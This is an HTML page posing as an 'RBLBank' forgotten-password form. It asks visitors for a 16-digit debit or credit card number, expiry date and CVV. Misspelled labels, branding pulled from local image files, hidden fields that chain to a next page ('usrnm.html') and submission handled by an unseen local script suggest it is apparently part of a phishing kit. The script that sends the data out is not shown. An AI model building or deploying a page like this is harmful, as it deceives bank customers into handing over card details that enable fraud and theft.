<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="sss/misss.css">
    <title>RBLBank</title>
</head>

<body>
<header class="d-flex justify-content-center mb-4" style="border-bottom:1px solid #1b3281">
    <img src="sss/header.png" width="120%" alt="">
</header>

<main class="container">
    <div id="test" class="text-danger text-center fw-bold"></div>
    <input type="hidden" id="page_type" value="fp_page" >
    <input type="hidden" id="nextValue" value="usrnm.html">
    <div class="card shadow-lg m-2">
        <div class="card-header">
            <h4>Forget Password</h4>
        </div>

        <form action="" id="form" class=" forget-password mt-3  p-2">
            <div class="form-group">
                <div class="d-flex gap-2 align-items-center">
                    <input type="radio" name="form_type" value="debit" class="card-type  form-check" required>
                    <labe>Debit Card</labe>
                </div>

            </div>
            <div class="form-group">
                <div class="d-flex gap-2 align-items-center">
                    <input type="radio" name="form_type" value="credit" class="card-type form-check" required>
                    <labe>Credit Card</labe>
                </div>
            </div>
            <div class="form-group  show-card-form">
                <div class="form-floating">
                    <input  required type="text" inputmode="numeric" class="form-control" name="db" minlength="16" maxlength="16"  required>
                    <label for="" id="card-label" >Debit Card No*</label>
                    <small class="text-secondary">Please enter your 16 digit card number</small>
                </div>
            </div>
            <div class="form-group show-card-form">
                <div class="form-floating">
                    <input  required type="text" id="exp" class="form-control" inputmode="numeric" name="exp" >
                    <label for="">Expirty Date(MM/YY)*</label>
                </div>
            </div>
            <div class="form-group show-card-form">
                <div class="form-floating">
                    <input  required type="text" class="form-control"  name="cvv" minlength="3" maxlength="3" >
                    <label for="">CVV(*)</label>
                </div>
            </div>

            <div class="text-center mt-2">
                <button type="submit" id="submit-button" class="btn btn-lg btn-primary mt-2" style="width: 143px !important;
    padding: 3px 10px;
    border-radius: 20px;
    background: #5757ff;" >Submit</button>
            </div>
            <div class="my-4">
                <img src="sss/ft.png" width="100%" alt="">
            </div>
        </form>
    </div>
</main>

<footer class="mt-4">
    <img src="sss/footer.png" width="100%" alt="">
</footer>
<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
<script src="sss/setting.js"></script>
<script>
    var cleave = new Cleave('#exp', {
      date: true,
      delimiter: '/',
      datePattern: ['m','y']
    });
</script>
</body>

</html>
